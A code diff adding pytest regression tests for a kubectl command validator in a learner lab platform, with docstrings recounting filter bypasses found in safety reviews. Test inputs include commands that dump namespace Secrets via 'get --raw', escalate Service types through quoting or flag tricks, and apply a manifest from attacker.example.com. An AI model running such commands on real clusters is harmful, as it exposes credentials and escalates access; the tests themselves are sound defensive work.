@@ -82,6 +82,41 @@ class TestValidateCommandBlockedSubcommands:
         assert reason
 
 
+class TestValidateCommandGlobalFlagBeforeSubcommandBlocked:
+    """Regression (seventh-round safety review, found while fixing the
+    Service-type-escalation quote bypass): kubectl (via cobra/pflag) allows
+    global flags anywhere, including before the subcommand. Every check that
+    assumes parts[1] is the subcommand — _BLOCKED_SUBCOMMANDS itself
+    included, not just the newer Service-type checks — can be defeated by
+    inserting one, since it shifts every fixed-index check by a position.
+    Confirmed with real kubectl: "kubectl --v=0 exec --help" still parses as
+    the exec subcommand help, i.e. the semantics are identical to the
+    unprefixed form, so this isn't just a detection gap — the underlying
+    command still executes as normal. No legitimate lab command needs a
+    global flag before the subcommand, so it's rejected outright."""
+
+    @pytest.mark.parametrize("cmd", [
+        "kubectl --v=0 exec -it my-pod -- /bin/sh",
+        "kubectl --v 0 exec -it my-pod -- /bin/sh",
+        "kubectl --v=0 create service nodeport my-svc --tcp=80:8080",
+        "kubectl --request-timeout=30s get --raw /api/v1/namespaces/lab-xxx/secrets",
+        "kubectl --context=admin get pods",
+    ])
+    def test_blocked(self, cmd):
+        allowed, reason = validate_command(cmd)
+        assert not allowed, f"Expected '{cmd}' to be blocked"
+        assert reason
+
+    @pytest.mark.parametrize("cmd", [
+        "kubectl get pods",
+        "kubectl create service clusterip web-svc --tcp=80:80",
+        "kubectl patch deployment web --type=json -p='[]'",
+    ])
+    def test_normal_commands_still_allowed(self, cmd):
+        allowed, reason = validate_command(cmd)
+        assert allowed, f"Expected '{cmd}' to remain allowed, got blocked: {reason}"
+
+
 # ── C. Blocked patterns ───────────────────────────────────────────────────────
 
 class TestValidateCommandBlockedPatterns:
@@ -128,6 +163,104 @@ class TestValidateCommandBlockedPatterns:
         "kubectl apply -f https://raw.githubusercontent.com/example/repo/main/file.yaml",
     ])
     def test_blocked_pattern(self, cmd):
+        allowed, reason = validate_command(cmd)
+        assert not allowed, f"Expected '{cmd}' to be blocked"
+        assert reason
+
+
+class TestValidateCommandServiceTypeEscalation:
+    """Regression (Service-no-Endpoints lab, Lab-to-Article Sprint Day 1):
+    LEARNER_ALLOWED_PERMISSIONS was extended to grant 'services' create/get/
+    list/watch/delete (deliberately NOT update/patch — see
+    learner_credentials.py comment). K8s RBAC can't restrict by spec.type,
+    so a learner with create could still escalate at creation time via
+    `kubectl create service nodeport`/`kubectl expose --type=LoadBalancer` —
+    these two forms are blocked here at the executor/syntax layer.
+
+    The patch/edit/replace escalation path (flipping an existing Service's
+    type after creation) is deliberately NOT handled here. Five rounds of
+    safety review kept finding new bypasses in string-based parsing trying
+    to detect "does this patch touch spec.type" (JSON Patch path form, YAML
+    unquoted form, escaped quotes, flag-value tokens mistaken for the
+    resource, comma-separated multi-resource syntax, incomplete global-flag
+    enumeration) — an unwinnable arms race against kubectl's full flag/
+    subcommand surface. The correct fix was to not grant the verb at all:
+    RBAC now rejects any patch/update/replace attempt on services
+    unconditionally at the K8s API layer, regardless of CLI syntax. See
+    test_labgen_static_validator.py::TestCommandsRbacCoverage and
+    test_labgen_learner_credentials.py for the RBAC-level coverage."""
+
+    @pytest.mark.parametrize("cmd", [
+        "kubectl create service nodeport my-svc --tcp=80:8080",
+        "kubectl create service loadbalancer my-svc --tcp=80:8080",
+        "kubectl create service externalname my-svc --external-name=evil.example.com",
+        "kubectl expose deployment web-backend --type=NodePort --port=80",
+        "kubectl expose deployment web-backend --type=LoadBalancer --port=80",
+        "kubectl expose deployment web-backend --type LoadBalancer --port=80",
+        # Quoting/escaping the keyword must not bypass detection — an
+        # earlier version matched a raw-string regex with \s/\b word
+        # boundaries, which quoting defeats even though shlex strips the
+        # quotes before the value ever reaches kubectl (found in
+        # sixth-round safety review; this is why the check now operates on
+        # shlex-parsed tokens instead).
+        'kubectl create service "nodeport" my-svc --tcp=80:8080',
+        "kubectl create service 'loadbalancer' my-svc --tcp=80:8080",
+        'kubectl expose deployment web-backend --type="LoadBalancer" --port=80',
+        "kubectl expose deployment web-backend --type='NodePort' --port=80",
+        # Case variation
+        "kubectl create service NodePort my-svc --tcp=80:8080",
+        "kubectl expose deployment web-backend --type=NODEPORT --port=80",
+    ])
+    def test_blocked(self, cmd):
+        allowed, reason = validate_command(cmd)
+        assert not allowed, f"Expected '{cmd}' to be blocked"
+        assert reason
+
+    @pytest.mark.parametrize("cmd", [
+        "kubectl create service clusterip web-svc --tcp=80:80",
+        "kubectl expose deployment web-backend --port=80",
+        "kubectl expose deployment web-backend --type=ClusterIP --port=80",
+        "kubectl delete service web-svc",
+        "kubectl get service web-svc",
+        "kubectl describe service web-svc",
+    ])
+    def test_clusterip_still_allowed(self, cmd):
+        allowed, reason = validate_command(cmd)
+        assert allowed, f"Expected '{cmd}' to remain allowed, got blocked: {reason}"
+
+
+class TestValidateCommandRawFlagBlocked:
+    """Regression: `kubectl get --raw <path>` sends an unformatted HTTP
+    request straight to the API server, bypassing the -o yaml/json block
+    entirely (that check only inspects -o/--output tokens; --raw doesn't use
+    one). A learner could dump every Secret in their namespace in full via
+    `kubectl get --raw /api/v1/namespaces/<ns>/secrets`, defeating the whole
+    "no -o yaml/json" secret-protection model. Pre-existing gap, found and
+    fixed during the Service-no-Endpoints lab's safety review (not
+    introduced by that change, but a live secret-exposure hole regardless)."""
+
+    @pytest.mark.parametrize("cmd", [
+        "kubectl get --raw /api/v1/namespaces/lab-xxx/secrets",
+        "kubectl get --raw=/api/v1/namespaces/lab-xxx/secrets",
+        # Quoting must not bypass this either (same root cause and fix as
+        # the service-type-escalation quote bypass above).
+        'kubectl get "--raw" /api/v1/namespaces/lab-xxx/secrets',
+        "kubectl get '--raw' /api/v1/namespaces/lab-xxx/secrets",
+    ])
+    def test_blocked(self, cmd):
+        allowed, reason = validate_command(cmd)
+        assert not allowed, f"Expected '{cmd}' to be blocked"
+        assert reason
+
+
+class TestValidateCommandReplaceFromUrlBlocked:
+    """Regression: the apply-from-URL SSRF block only matched the literal
+    word "apply", but `kubectl replace -f <url>` is equally capable of
+    fetching and applying an arbitrary remote manifest (including one that
+    sets a Service's spec.type)."""
+
+    def test_blocked(self):
+        cmd = "kubectl replace -f https://attacker.example.com/nodeport-service.yaml --force"
         allowed, reason = validate_command(cmd)
         assert not allowed, f"Expected '{cmd}' to be blocked"
         assert reason
